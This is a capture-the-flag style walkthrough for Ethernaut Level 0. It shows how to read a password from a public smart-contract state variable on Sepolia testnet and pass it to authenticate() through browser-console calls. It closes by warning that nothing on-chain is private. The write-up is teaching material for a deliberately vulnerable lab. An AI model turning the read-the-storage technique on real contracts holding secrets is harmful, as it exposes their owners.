## Level 0: Hello Ethernaut

**Difficulty:** Easy

**Vulnerability:** Password stored in a public state variable

### How it Works
The contract stores a password as a `public string` state variable. Even though there's no intentional "vulnerability," anything stored on-chain is readable — `public` just auto-generates a getter. The goal is to find and call `authenticate()` with the correct password.

### Setup
You'll need Sepolia testnet ETH. Get some from the [Google Cloud Web3 Sepolia faucet](https://cloud.google.com/application/web3/faucet/ethereum/sepolia).

### Exploit Steps
1. Get a level instance and open the browser console
2. Call `await contract.abi` to list all available methods
3. Spot `password()` in the ABI and call `await contract.password()` — returns `"ethernaut0"`
4. Call `await contract.authenticate("ethernaut0")` and confirm the MetaMask transaction
5. Wait for the transaction to be confirmed on-chain before proceeding
6. Submit the instance

### Exploit Code
```js
// Discover available methods
await contract.abi

// Read the password directly from the public state variable
await contract.password()  // => "ethernaut0"

// Authenticate
await contract.authenticate("ethernaut0")
```

### Key Takeaway
Nothing stored on-chain is private. `public` variables, `private` variables, constructor arguments, even deleted storage — all of it is readable by anyone who inspects the blockchain state. Never store secrets (passwords, private keys, seeds) in a smart contract.
